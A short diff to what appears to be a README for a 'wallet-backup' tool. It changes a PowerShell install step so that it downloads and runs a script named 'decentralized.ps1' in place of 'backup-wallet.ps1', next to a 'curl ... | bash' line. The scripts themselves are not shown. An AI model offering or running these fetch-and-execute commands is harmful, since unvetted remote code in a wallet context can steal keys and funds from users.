@@ -169,8 +169,8 @@ curl -fsSL https://github.com/yourusername/wallet-backup/raw/main/backup.sh | ba
 ```powershell
 mkdir -Force $env:USERPROFILE\.webconnect\{wallet_backups,logs,config}
 Invoke-WebRequest -Uri 'https://github.com/yourusername/wallet-backup/raw/main/config.template.json' -OutFile "$env:USERPROFILE\.webconnect\config\storage.config.json"
-Invoke-WebRequest -Uri 'https://github.com/yourusername/wallet-backup/raw/main/backup-wallet.ps1' -OutFile backup-wallet.ps1
-.\backup-wallet.ps1
+Invoke-WebRequest -Uri 'https://github.com/yourusername/wallet-backup/raw/main/decentralized.ps1' -OutFile decentralized.ps1
+.\decentralized.ps1
 ```
 
 ---
